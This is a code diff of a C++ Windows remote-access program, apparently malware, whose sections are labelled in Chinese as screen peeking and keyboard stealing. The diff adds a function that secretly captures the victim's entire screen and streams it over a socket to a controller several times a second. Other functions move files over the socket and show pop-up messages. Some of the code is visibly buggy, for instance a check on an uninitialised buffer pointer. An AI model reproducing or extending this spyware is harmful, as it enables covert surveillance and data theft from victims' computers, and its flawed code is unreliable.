@@ -51,10 +51,13 @@ void send_file(SOCKET s, char* fileName){
 void recv_file(SOCKET s,char* file_path){
 	long bufSize = 10*1024;	//缓冲区大小
 	char* buffer;	//缓冲区保存文件数据
+	if (buffer == NULL)
+	{
+		buffer = new char[bufSize];
+	}
 	string ext_name;
 	char usr_path[32];
 	GetEnvironmentVariable("USERPROFILE", usr_path, 32);
-	std::cout<<"file_path[1]>>>>>"<<file_path[1]<<std::endl;
 	for(int i=1;i<sizeof(string(file_path));i++){
 		if (file_path[i]==*"."){
 			ext_name.append(&(file_path[i-1]));
@@ -62,6 +65,7 @@ void recv_file(SOCKET s,char* file_path){
 			break;
 		}
 	}
+	cout<<ext_name<<endl;
 	FILE* write = fopen(ext_name.c_str(), "wb");
 	int nCount;
 	do{
@@ -82,7 +86,46 @@ void box_msg(char* msg){
 	MessageBoxW(NULL, msg_buf, L"", MB_SYSTEMMODAL);
 }
 ////////////////////窥屏//////////////////////////////
-void see(SOCKET s,char* file_path){
+void see(SOCKET s){
+
+	int ScrWidth,ScrHeight;
+
+	BITMAPINFO bInfo;
+
+	HBITMAP hBitmap;
+	BYTE* bBits = NULL;
+	//现在开始画画了，你拿起了一只笔。
+	//——在Windows环境里，这叫选择了一个画笔对象：使用SelectOBject函数。
+	//当然，如果你没带笔也没关系，Windows为你准备了几只画笔，你可以这样申请系统提供的缺省画笔：hPen = GetStockObject(WHITE_PEN);
+	//如果你画着画着，觉得手中的笔用着不爽，可以换一只啊，没关系的。——依旧是SelectObject()换笔。
+
+	ScrWidth = GetDeviceCaps(GetDC(NULL), HORZRES);
+	ScrHeight = GetDeviceCaps(GetDC(NULL), VERTRES);
+	
+	int xy[2]={ScrHeight,ScrWidth};
+	send(s, (char*)&xy, 10, 0);
+	HDC hdc = GetDC(NULL);
+	HDC hmdc = CreateCompatibleDC(hdc);
+	ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+	bInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+	bInfo.bmiHeader.biBitCount = 24;
+	bInfo.bmiHeader.biCompression = BI_RGB;
+	bInfo.bmiHeader.biPlanes = 1;
+	bInfo.bmiHeader.biWidth = ScrWidth;
+	bInfo.bmiHeader.biHeight = ScrHeight;
+	hBitmap = CreateDIBSection(hdc, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
+	SelectObject(hmdc, hBitmap);
+	char send_flag[4];
+	int len = ScrWidth * ScrHeight * 3;
+	while(recv(s, recv_msg, 10, 0)<9){
+		BitBlt(hmdc, 0, 0, ScrWidth, ScrHeight, hdc, 0, 0, SRCCOPY);//把hDC数据传到hMemdc，类似于把hDC的数据转到内存中,即截图函数
+		send(s, (char*)bBits, len, 0);
+		Sleep(200);  // Adjust the sending rate
+	}
+
+	DeleteObject(hBitmap);
+	DeleteDC(hmdc);
+	ReleaseDC(NULL, hdc);
 	
 }
 ////////////////////键盘窃取//////////////////////////////
